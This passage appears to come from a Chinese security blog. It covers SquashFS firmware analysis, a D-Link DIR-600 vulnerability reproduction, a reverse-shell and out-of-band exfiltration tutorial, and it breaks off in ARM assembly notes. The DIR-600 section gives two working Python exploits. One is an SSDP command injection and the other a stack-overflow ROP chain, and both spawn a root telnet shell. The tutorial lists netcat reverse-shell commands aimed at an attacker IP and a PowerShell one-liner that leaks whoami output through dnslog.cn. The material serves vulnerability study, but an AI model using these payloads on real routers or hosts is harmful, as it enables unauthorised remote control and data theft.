class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">squashfs_super_block</span> &#123;</span><br>    __le32 s_magic;              <span class="hljs-comment">// 魔数，固定为 0x73717368 (&quot;hsqs&quot;)</span><br>    __le32 inodes;               <span class="hljs-comment">// inode 总数</span><br>    __le32 mkfs_time;            <span class="hljs-comment">// 创建时间（Unix 时间戳）</span><br>    __le32 block_size;           <span class="hljs-comment">// 块大小（通常为 128KB）</span><br>    __le32 fragments;            <span class="hljs-comment">// 碎片数量</span><br>    __le16 compression;          <span class="hljs-comment">// 压缩算法类型</span><br>    __le16 block_log;            <span class="hljs-comment">// log2(block_size)</span><br>    __le16 flags;                <span class="hljs-comment">// 标志位，如是否启用校验、是否排序等</span><br>    __le16 no_ids;               <span class="hljs-comment">// id 数量（用于用户和组）</span><br>    __le16 s_major;              <span class="hljs-comment">// 主版本号</span><br>    __le16 s_minor;              <span class="hljs-comment">// 次版本号</span><br><br>    __le64 root_inode;           <span class="hljs-comment">// 根目录 inode 的偏移地址</span><br>    __le64 bytes_used;           <span class="hljs-comment">// 镜像总大小（含 superblock）</span><br>    __le64 id_table_start;       <span class="hljs-comment">// ID 表起始地址</span><br>    __le64 xattr_id_table_start;<span class="hljs-comment">// xattr ID 表地址</span><br>    __le64 inode_table_start;    <span class="hljs-comment">// inode 表地址</span><br>    __le64 directory_table_start;<span class="hljs-comment">// 目录表地址</span><br>    __le64 fragment_table_start; <span class="hljs-comment">// 碎片表地址</span><br>    __le64 export_table_start;   <span class="hljs-comment">// export 表地址（用于 NFS 等）</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="2-关键字段解析"><a href="#2-关键字段解析" class="headerlink" title="2. 关键字段解析"></a>2. <strong>关键字段解析</strong></h3><ul><li><p><code>s_magic</code>: 魔数 <code>&quot;hsqs&quot;</code>，用于校验是否为 SquashFS 文件系统。</p></li><li><p><code>block_size</code>: 影响读性能和压缩效果，越大压缩比越高，但访问小文件可能效率降低。</p></li><li><p><code>compression</code>: 表示所用压缩算法，如 <code>1</code> 为 zlib，<code>2</code> 为 lzma，<code>3</code> 为 lzo，<code>4</code> 为 xz，<code>5</code>为lz4，<code>6</code> 为 zstd。</p></li><li><p><code>root_inode</code>: 是根目录的入口，在挂载时会从此位置开始解析整个文件系统的目录树。</p></li><li><p><code>inode_table_start</code> 和 <code>directory_table_start</code>: 定位核心的文件与目录元数据。</p></li><li><p><code>flags</code>: 标志位，各个标志位如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SQUASHFS_NOI            0        <span class="hljs-comment">// SQUASHFS_UNCOMPRESSED_INODES（未压缩的 inode）</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SQUASHFS_NOD            1        <span class="hljs-comment">// SQUASHFS_UNCOMPRESSED_DATA（未压缩的数据块）</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SQUASHFS_NOF            3        <span class="hljs-comment">// SQUASHFS_UNCOMPRESSED_FRAGMENTS（未压缩的碎片）</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SQUASHFS_NO_FRAG        4        <span class="hljs-comment">// SQUASHFS_NO_FRAGMENTS（不使用碎片）</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SQUASHFS_ALWAYS_FRAG    5        <span class="hljs-comment">// SQUASHFS_ALWAYS_FRAGMENTS（总是使用碎片）</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SQUASHFS_DUPLICATE      6        <span class="hljs-comment">// SQUASHFS_DUPLICATES（启用重复数据检测）</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SQUASHFS_EXPORT         7        <span class="hljs-comment">// SQUASHFS_EXPORTABLE（导出支持，如 NFS）</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SQUASHFS_COMP_OPT       10       <span class="hljs-comment">// SQUASHFS_COMP_OPTS（压缩选项相关）</span></span><br></code></pre></td></tr></table></figure><p>检测标志位宏</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">SQUASHFS_BIT</span>(flag, bit)((flag &gt;&gt; bit) &amp; <span class="hljs-number">1</span>)  #检测对应的标志位是否为<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="3-实际分析方法"><a href="#3-实际分析方法" class="headerlink" title="3. 实际分析方法"></a>3. <strong>实际分析方法</strong></h3><blockquote><p>基于IOT固件分析</p></blockquote><p>得到加密固件，先用binwalk3分析，看到文件系统起始位置和大小</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250523160656453.png" alt="image-20250523160649322"></p><p>用dd命令提取出来文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=MX25L25633F@WSON8_20230829_113609.BIN of=300000.squashfs bs=1 skip=3145728 count=20383964<br></code></pre></td></tr></table></figure><p>用工具squashfs-info分析文件系统<strong>superblack</strong>内容，就可以分析相关加密了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ ./squashfs-info 300000.squashfs<br>s_magic:                1936814952<br>inodes:                 1711<br>mkfs_time:              1675834056<br>block_size:             1048576<br>fragments:              27<br>compresultsion:         4<br>block_log:              20<br>flags:                  192<br>no_ids:                 2<br>s_major:                4<br>s_minor:                0<br>root_inode:             735320905<br>bytes_used:             20383964<br>id_table_start:         20383956<br>xattr_id_table_start:   18446744073709551615<br>inode_table_start:      20349938<br>directory_table_start:  20362450<br>fragment_table_start:   20380678<br>lookup_table_start:     20383930<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>IOT安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DIR-600漏洞复现</title>
    <link href="/2025/05/21/DIR-600%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/21/DIR-600%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="DRI-600-漏洞复现简要"><a href="#DRI-600-漏洞复现简要" class="headerlink" title="DRI-600 漏洞复现简要"></a>DRI-600 漏洞复现简要</h1><h2 id="漏洞一"><a href="#漏洞一" class="headerlink" title="漏洞一"></a>漏洞一</h2><ul><li>命令注入漏洞</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>cgibin注册多个函数 ， 我们定位到ssdpcgi_main函数，是一个基于SSDP 协议的服务，SSDP 协议是基于UDP协议的</p><p>SSDP 包结构</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">M-SEARCH * HTTP/<span class="hljs-number">1.1</span> <span class="hljs-meta"># SSDP</span><br><span class="hljs-symbol">HOST:</span> <span class="hljs-number">239.255</span><span class="hljs-number">.255</span><span class="hljs-number">.250</span>:<span class="hljs-number">1900</span> <br><span class="hljs-symbol">MAN:</span> <span class="hljs-string">&quot;ssdp:discover&quot;</span> <br><span class="hljs-symbol">ST:</span> upnp:rootdevice<br><span class="hljs-symbol">MX:</span> <span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure><ul><li><code>M-SEARCH</code> 是 SSDP 的主动搜索指令</li><li><code>HOST:</code> 告诉它你是发给 SSDP 组播地址（也可用局部设备IP）</li><li><code>MAN: &quot;ssdp:discover&quot;</code>：声明这是一条服务发现请求</li><li><code>ST: ssdp:all</code>：声明你寻找所有类型的服务（也可以是 <code>upnp:rootdevice</code>、<code>uuid:xxx</code>）</li><li><code>MX</code>：SSDP 协议中 响应延迟时间</li></ul><p>定位到这里，需要指定参数的都有命令注入风险</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165614263.png" alt="image-20250521165614204"></p><p>通过格式化字符串，完成命令注入</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165731826.png" alt="image-20250521165731769"></p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165825939.png" alt="image-20250521165825883"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">config_payload</span>(<span class="hljs-params">ip, port</span>):<br>    payload = (<br>          <span class="hljs-string">b&quot;M-SEARCH * HTTP/1.1\r\n&quot;</span><br>        + <span class="hljs-string">f&quot;HOST: <span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>\r\n&quot;</span>.encode()<br>        + <span class="hljs-string">b&quot;ST:uuid:;telnetd -l /bin/sh -p 9999\r\n&quot;</span><br>        + <span class="hljs-string">b&quot;MX: 2\r\n&quot;</span> <br>        + <span class="hljs-string">b&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span><br>        + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    )<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">ip, port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        sock = socket.socket(<br>            socket.AF_INET,<br>            socket.SOCK_DGRAM,<br>            socket.IPPROTO_UDP<br>        )<br>        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">2</span>)<br>        payload = config_payload(ip, port)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Targeting <span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>)<br>        sock.sendto(payload, (ip, port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Exploit packet sent successfully&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Check telnet service on port 9999&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    IP = <span class="hljs-string">&quot;192.168.0.1&quot;</span><br>    SSDP_PORT = <span class="hljs-number">1900</span><br>    send_payload(IP, SSDP_PORT)<br></code></pre></td></tr></table></figure><h2 id="漏洞二"><a href="#漏洞二" class="headerlink" title="漏洞二"></a>漏洞二</h2><ul><li>栈溢出漏洞</li></ul><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>定位到认证函数authenticationcgi_main，这里获取id和password并没有进行长度验证，当进行strcpy的时候，就会发生栈溢出</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521170224602.png" alt="image-20250521170224538"></p><p>利用bp测试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/authentication.cgi?id=aaaaaa&amp;password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uid=SdRpsGe1Do<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><p>发现果然崩溃了</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521170800808.png" alt="image-20250521170800716"></p><p>接下来就构建rop链，需要控制返回地址和参数，从这个函数结尾可以看到，恢复压栈的参数，我们既然可以控制栈，当然可以控制这些参数，所以我们需要找到一个调用system代码段</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521171806569.png" alt="image-20250521171806518"></p><p>之前的命令注入漏洞就有一个代码段比较合适</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521172210738.png" alt="image-20250521172210678"></p><p>在构建ROP的时候有两个点需要注意</p><ol><li>strcpy会\x00截断，无法直接通过id来实现控制返回地址和参数</li><li>password会对空格进行编码，需要绕过一下</li></ol><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><br>load_system = <span class="hljs-number">0x00413F24</span><br>sh_addr = <span class="hljs-number">0x43a190</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x81c</span> + p32(load_system)<br>password = <span class="hljs-string">b&#x27;telnetd$&#123;IFS&#125;-l$&#123;IFS&#125;/bin/sh$&#123;IFS&#125;-p$&#123;IFS&#125;8888;&#x27;</span><br>password = password.ljust(<span class="hljs-number">0x400</span> , <span class="hljs-string">b&#x27;b&#x27;</span>) + p32(sh_addr)<br><br>url = <span class="hljs-string">&quot;http://192.168.0.1/authentication.cgi&quot;</span><br>params = &#123;<br>  <span class="hljs-string">&quot;id&quot;</span> : <span class="hljs-built_in">id</span> , <br>  <span class="hljs-string">&quot;password&quot;</span> : password<br>&#125;<br>response = requests.get(url = url , params = params).text<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure><h2 id="所遇问题"><a href="#所遇问题" class="headerlink" title="所遇问题"></a>所遇问题</h2><ol><li>漏洞挖掘有什么通用的挖洞思路？</li><li>怎么进行测试快速发现漏洞？</li><li>必备的技术栈有哪些？</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</title>
    <link href="/2025/05/05/%E5%8F%8D%E5%BC%B9SHELL-%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%A6%E5%A4%96-%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
    <url>/2025/05/05/%E5%8F%8D%E5%BC%B9SHELL-%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%A6%E5%A4%96-%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="反弹SHELL-不回显带外-正反向连接-防火墙出入站-文件下载"><a href="#反弹SHELL-不回显带外-正反向连接-防火墙出入站-文件下载" class="headerlink" title="反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载"></a>反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</h1><h2 id="0x01-文件下载"><a href="#0x01-文件下载" class="headerlink" title="0x01 文件下载"></a>0x01 文件下载</h2><p>文件下载命令是因为很多时候拿到权限了，但是没有图像化界面，只能用命令进行下载文件，来达到我们想要的效果。例如：我们在我们服务器上有个nc文件，利用一些命令注入漏洞来让目标机下载nc，然后再用我们下面讲的正反向连接，拿到shell。</p><p><a href="https://forum.ywhack.com/bountytips.php?download">文件上传命令手册</a></p><h2 id="0x02-正反向连接"><a href="#0x02-正反向连接" class="headerlink" title="0x02 正反向连接"></a>0x02 正反向连接</h2><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250505210632386.png" alt="image-20250505210632320"></p><p>其实这个概念很简单</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>攻击者主动连接目标机，也就是目标机监听某个端口，攻击者进行连接请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">攻击者（连接）：<br>nc 目标机 9999 <br><br>目标机（监听）：<br>nc -lvnp 9999 -e /bin/sh<br></code></pre></td></tr></table></figure><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>服务端主动连接客户端，服务端主动发送连接给客户端，客户端监听端口，用于绕过防火墙的入站规则&#x2F;内网穿透</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">攻击者（监听）：<br>nc -lvnp 9999<br><br>目标机（发起连接）：<br>nc 攻击者IP 9999 -e /bin/sh<br><br></code></pre></td></tr></table></figure><p>这个具体用那种方式进行反弹shell，取决于攻击者和目标机的谁能访问到谁，例如：目标机在局域网中，攻击机有公网IP，很明显目标机能连接到攻击机，攻击机连接不到目标机，这时候就需要用反向连接</p><h2 id="0x03-反弹SHELL"><a href="#0x03-反弹SHELL" class="headerlink" title="0x03 反弹SHELL"></a>0x03 反弹SHELL</h2><h3 id="反弹SHELL概念"><a href="#反弹SHELL概念" class="headerlink" title="反弹SHELL概念"></a>反弹SHELL概念</h3><p>在反弹 Shell 中，目标机器（被攻击者的机器）会<strong>主动连接到攻击者的机器</strong>，并通过这个连接将其控制权限“反弹”回攻击者</p><p>这通常用来绕过目标机器的 <strong>防火墙</strong> 或 <strong>网络地址转换（NAT）</strong>，因为目标机器<strong>通常能够发起外部连接</strong>，而不能接受外部连接（例如：内网主机）</p><p>也就是我们前面说的反向连接的利用。</p><ol><li><p><strong>攻击者（监听）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 9999<br></code></pre></td></tr></table></figure></li><li><p><strong>目标机器（反弹 shell）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 攻击者IP 9999 -e /bin/bash<br></code></pre></td></tr></table></figure></li></ol><p>在这两步中，目标机器连接到攻击者的 4444 端口，成功后，攻击者就可以通过这个连接<strong>执行目标机器上的命令</strong>。</p><h3 id="反弹-Shell-的实际应用"><a href="#反弹-Shell-的实际应用" class="headerlink" title="反弹 Shell 的实际应用"></a>反弹 Shell 的实际应用</h3><ul><li><strong>绕过防火墙</strong>：防火墙通常会阻止入站连接，但允许出站连接。通过反弹 shell，攻击者只需要监听一个端口，等待目标机器主动连接。</li><li><strong>内网渗透</strong>：攻击者可能通过反弹 shell 连接到目标的内网机器，在该机器上执行命令并获取进一步的控制权限。</li><li><strong>远程控制</strong>：通过反弹 shell，攻击者可以完全控制目标机器，执行操作如文件读取、系统命令执行等。</li></ul><h2 id="0x04-防火墙出入站"><a href="#0x04-防火墙出入站" class="headerlink" title="0x04 防火墙出入站"></a>0x04 防火墙出入站</h2><p>说白了就是通过防火墙设置出入站规则，来限制一些流量的出入</p><h2 id="0x05-不回显带外"><a href="#0x05-不回显带外" class="headerlink" title="0x05 不回显带外"></a>0x05 不回显带外</h2><p>让命令注入没有回显的时候，可以用<a href="http://www.dnslog.cn/">dnslog</a>来命令回显。</p><p>用皮卡丘演示一下，把这个ping的打印注释掉</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250505210653901.png" alt="image-20250505210653821"></p><p>直接ping dns会在网站得到回显得到回显，那我们可以利用这个构造一下域名，来得到我们想要的信息</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | powershell <span class="hljs-variable">$x</span> = (<span class="hljs-built_in">whoami</span>).replace(<span class="hljs-string">&#x27;\&#x27;</span> , <span class="hljs-string">&#x27;xxx&#x27;</span>);<span class="hljs-variable">$y</span> =<span class="hljs-string">&#x27;.c3fskt.dnslog.cn&#x27;</span>;<span class="hljs-variable">$z</span> = <span class="hljs-variable">$x</span> + <span class="hljs-variable">$y</span>;ping <span class="hljs-variable">$z</span>;<br></code></pre></td></tr></table></figure><p>可见我们直接得到了用户主机名</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250505210706265.png" alt="image-20250505210706186"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ARM汇编学习</title>
    <link href="/2025/04/22/ARM%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/04/22/ARM%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="ARM汇编学习"><a href="#ARM汇编学习" class="headerlink" title="ARM汇编学习"></a>ARM汇编学习</h1><h2 id="ARM寄存器"><a href="#ARM寄存器" class="headerlink" title="ARM寄存器"></a>ARM寄存器</h2><h3 id="ARMv7（32位）："><a href="#ARMv7（32位）：" class="headerlink" title="ARMv7（32位）："></a><strong>ARMv7（32位）</strong>：</h3><table><thead><tr><th>寄存器</th><th>角色</th></tr></thead><tbody><tr><td><strong>R0 - R3</strong></td><td>用于传递前四个参数。最多四个参数会通过这些寄存器传递。</td></tr><tr><td><strong>R4 - R11</strong></td><td>用于存储其他局部变量，函数内部的计算可以使用这些寄存器。</td></tr><tr><td><strong>R12</strong></td><td>被称为“内存临时寄存器”，可以用于存储局部变量或函数计算结果。</td></tr><tr><td><strong>R13 (SP)</strong></td><td>堆栈指针，指向栈的当前顶部，函数调用时，参数和返回地址可能会压栈。</td></tr><tr><td><strong>R14 (LR)</strong></td><td>链接寄存器，用于存储返回地址，即调用函数后程序返回的位置。</td></tr><tr><td><strong>R15 (PC)</strong></td><td>程序计数器，指向正在执行的指令地址。</td></tr></tbody></table><h3 id="程序状态寄存器（CPSR）"><a href="#程序状态寄存器（CPSR）" class="headerlink" title="程序状态寄存器（CPSR）"></a><strong>程序状态寄存器（CPSR）</strong></h3><table><thead><tr><th>位数</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>31-28</td><td>M[4:0]</td><td>当前处理器模式（Mode），包括用户模式、特权模式等。</td></tr><tr><td>27</td><td>T</td><td>Thumb模式指示位，如果为1，则表示执行Thumb指令集。</td></tr><tr><td>26</td><td>F</td><td>FIQ中断使能位，如果为1，表示使能快速中断。</td></tr><tr><td>25</td><td>I</td><td>IRQ中断使能位，如果为1，表示使能普通中断。</td></tr><tr><td>24</td><td>A</td><td>对齐异常使能位，如果为1，表示使能对齐检查。</td></tr><tr><td>23</td><td>E</td><td>异常寄存器使能位，指定异常处理时是否使用扩展寄存器。</td></tr><tr><td>22-19</td><td>GE[3:0]</td><td>符号扩展标志，用于浮点计算模式。</td></tr><tr><td>18</td><td>J</td><td>指令缓存使能位，表示是否启用指令缓存。</td></tr><tr><td>17</td><td>Q</td><td>异常标志位，表示某些条件是否满足，例如计算结果是否溢出。</td></tr><tr><td>16</td><td>V</td><td>溢出标志位，标识算术操作是否发生溢出。</td></tr><tr><td>15-10</td><td>N, Z, C, V</td><td>条件代码标志位，分别表示负标志、零标志、进位标志、溢出标志。</td></tr></tbody></table><h3 id="程序模式（M字段）"><a href="#程序模式（M字段）" class="headerlink" title="程序模式（M字段）"></a><strong>程序模式（M字段）</strong></h3><table><thead><tr><th>M值</th><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>0x10</td><td>User Mode</td><td>用户模式，正常程序运行的模式。</td></tr><tr><td>0x1F</td><td>System Mode</td><td>系统模式，通常是内核模式或特权模式。</td></tr><tr><td>0x11</td><td>Supervisor Mode</td><td>监控模式，操作系统核心模式。</td></tr><tr><td>0x13</td><td>Abort 